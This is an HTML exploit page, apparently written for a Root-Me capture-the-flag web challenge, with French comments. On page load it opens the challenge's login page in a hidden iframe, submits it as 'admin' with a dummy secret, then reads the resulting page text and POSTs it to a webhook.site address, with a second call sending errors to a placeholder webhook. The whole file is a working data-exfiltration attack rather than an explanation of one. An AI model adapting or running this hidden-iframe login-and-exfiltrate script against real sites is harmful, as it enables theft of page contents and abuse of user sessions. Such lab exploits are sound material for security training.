<!DOCTYPE html>
<html>
  <head>
    <title>SOME Exploit</title>
  </head>
  <body>
    <h1>Loading...</h1>

    <!-- IFRAME caché vers la cible -->
    <iframe id="target" src="http://challenge01.root-me.org:58010/login" style="display:none;" onload="steal()"></iframe>

    <script>
      function steal() {
        const frame = document.getElementById("target");

        try {
          const doc = frame.contentWindow.document;

          // On récupère les éléments du formulaire
          const form = doc.querySelector("form");
          const usernameInput = doc.querySelector("#username");
          const secretInput = doc.querySelector("#secret");
          const csrfInput = doc.querySelector("input[name='csrf']");

          // On remplit les champs
          usernameInput.value = "admin";
          secretInput.value = "toto"; // peu importe, on veut juste déclencher le login
          
          // Soumettre après un délai pour laisser le DOM charger
          setTimeout(() => {
            form.submit();

            // Attendre la redirection après login
            setTimeout(() => {
              const innerText = frame.contentWindow.document.body.innerText;
              fetch("https://webhook.site/383980eb-38ac-4039-99bf-062454d3143b", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({ data: innerText })
              });
            }, 1000);

          }, 100);
        } catch (err) {
          fetch("https://webhook.site/TON_ID", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ error: err.toString() })
          });
        }
      }
    </script>
  </body>
</html>
